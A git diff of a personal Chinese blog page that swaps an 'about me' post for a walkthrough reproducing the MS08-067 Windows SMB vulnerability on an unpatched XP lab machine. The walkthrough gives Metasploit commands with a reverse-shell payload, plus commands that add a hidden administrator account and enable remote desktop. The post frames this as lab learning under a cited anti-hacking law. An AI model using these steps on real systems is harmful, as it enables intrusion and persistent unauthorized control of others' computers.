@@ -16,7 +16,7 @@
   <meta name="description" content="a boy enjoying the world">
   <meta name="author" content="Magic Ding">
   <meta name="keywords" content="">
-  <title>个人简介 - unkn0wn</title>
+  <title>ms08_067经典漏洞复现 - unkn0wn</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
@@ -123,7 +123,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期一, 三月 9日 2020, 4:30 下午
+                  星期二, 三月 10日 2020, 2:28 下午
                 </p>
               
 
@@ -132,7 +132,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    205 字
+                    898 字
                   </span>
                 
 
@@ -140,7 +140,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      1 分钟
+                      3 分钟
                   </span>
                 
 
@@ -175,24 +175,97 @@
           <div class="post-content mx-auto" id="post">
             
               <p
-                class="note note-warning">本文最后更新于：星期二, 三月 10日 2020, 2:50 下午</p>
+                class="note note-warning">本文最后更新于：星期二, 三月 10日 2020, 2:51 下午</p>
             
             <div class="markdown-body">
               <blockquote>
-<p>这是我的新博客，之前的博客因为一直没更就放弃了，这次希望能坚持做下去</p>
+<p>不要理会下面那句虎狼之词，继续搬运</p>
 </blockquote>
-<h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>一名末流985学校的菜鸡，计算机专业学生，软件开发爱好者，信息安全爱好者，重点方向是逆向工程。</p>
-<h2 id="准备写点什么"><a href="#准备写点什么" class="headerlink" title="准备写点什么"></a>准备写点什么</h2><p>程序开发、算法、CTF、以及一些奇怪的东西。</p>
-<h2 id="近期计划"><a href="#近期计划" class="headerlink" title="近期计划"></a>近期计划</h2><p>准备先移植一下之前在各平台发的文章之类的，会不定期更一些数据结构和信息安全内容。</p>
-<h2 id="单人博客？"><a href="#单人博客？" class="headerlink" title="单人博客？"></a>单人博客？</h2><p>会考虑让几个有想法的同学加入进来，做出一个优秀的IT博客，目前欢迎网络、软件开发、二进制、数学爱好者加入。</p>
-<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p>我的邮箱：<a href="mailto:dyn201885095@gmail.com">dyn201885095@gmail.com</a></p>
-<h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>fun in everything</p>
+<blockquote>
+<p>我竟然把这个坑填下去了，可喜可贺。(填下去个锤子！from半年后的自己)</p>
+</blockquote>
+<h2 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h2><blockquote>
+<p>刑法第二百八十六条违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p>
+</blockquote>
+<p>一定要清楚，我们做的是安全，一切的目的是更好的保护自己和他人。切记，切记！</p>
+<h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><p>ms08_067是微软win操作系统中存在的一个服务器服务漏洞，在win server2008之前的系统都会受这个漏洞影响，黑客可以利用这个漏洞控制目标系统。</p>
+<h2 id="操作概述"><a href="#操作概述" class="headerlink" title="操作概述"></a>操作概述</h2><p>使用kali linux攻击机对win xp系统利用此漏洞进行攻击，在靶机上建立管理员账号并远程控制靶机。</p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（上一篇博客提到过）</p>
+<p>win xp sp3 english（纯净版，不带任何补丁）</p>
+<h2 id="控制靶机"><a href="#控制靶机" class="headerlink" title="控制靶机"></a>控制靶机</h2><p>进入kali终端，输入以下命令运行msf：</p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<p>寻找并使用模块</p>
+<p>我们要找的是ms08_067漏洞，所以我们首先寻找此漏洞</p>
+<blockquote>
+<p>search ms08_067_netapi</p>
+</blockquote>
+<p>我们找到漏洞后，使用此漏洞</p>
+<blockquote>
+<p>use exploit/windows/smb/ms08_067_netapi</p>
+</blockquote>
+<p>加载攻击载体</p>
+<p>攻击载体有很多，我们这次使用shell_reverse_tcp（如果对渗透后攻击有想法的推荐Meterpreter）</p>
+<blockquote>
+<p>set payload generic/shell_reverse_tcp </p>
+</blockquote>
+<p>设置ip</p>
+<p>LHOST为攻击机ip，RHOST为靶机ip，例如：</p>
+<blockquote>
+<p>set LHOST 192.168.1.62</p>
+</blockquote>
+<p>寻找对应版本target</p>
+<p>target需要与靶机系统版本对应，在不确定版本时设置target为0也可自动选择</p>
+<blockquote>
+<p>set target 0</p>
+</blockquote>
+<p>运行</p>
+<blockquote>
+<p>exploit</p>
+</blockquote>
+<p>到此，我们就进入了靶机系统，你的kali Terminal应该显示以下信息。<br><a href="https://imgchr.com/i/8Progs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8Progs.md.png" srcset="/img/loading.gif" alt="8Progs.png" border="0" /></a></p>
+<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>接下来，我们尝试在靶机上创建账户并使用远程桌面连接靶机，</p>
+<p>首先，我们创建一个账户。</p>
+<blockquote>
+<p>user net host-name password /add</p>
+</blockquote>
+<p>提升为管理员权限</p>
+<blockquote>
+<p>net localgroup administrators host-name /add</p>
+</blockquote>
+<p>winxp远程操控端口为3389，我们将这个端口打开</p>
+<blockquote>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
+</blockquote>
+<p>使用netstat查看端口</p>
+<blockquote>
+<p>netstat -an</p>
+</blockquote>
+<p>这时，我们会发现3389端口处于开启状态。</p>
+<p>然后，我们可以用局域网内的计算机远程桌面连接到靶机，win10运行——&gt;MSTSC。</p>
+<p>以上就是ms08_067漏洞利用复现的全过程。</p>
+<h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="访问445端口被拒绝"><a href="#访问445端口被拒绝" class="headerlink" title="访问445端口被拒绝"></a>访问445端口被拒绝</h3><p>装了445端口补丁的winxp将445端口停用，所以复现此例程时不要使用带补丁的win xp。</p>
+<p>还有可能是因为靶机打开了防火墙，复现时需要将防火墙关闭。</p>
+<h3 id="设置target"><a href="#设置target" class="headerlink" title="设置target"></a>设置target</h3><p>如果不设置target，将不会判断靶机的系统版本进行攻击。建议将target设置为0，target为0时会自动判断靶机系统版本攻击。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>winxp上的漏洞其实还有很多，感兴趣的同学可以查一下其他的漏洞并尝试复现，折腾永不停止！</p>
 
             </div>
             <hr>
             <div>
               <p>
                 
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%A7%91%E6%99%AE/">科普</a>
+                    
+                  </span>
                 
               </p>
               
@@ -414,7 +487,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "个人简介&nbsp;",
+        "ms08_067经典漏洞复现&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
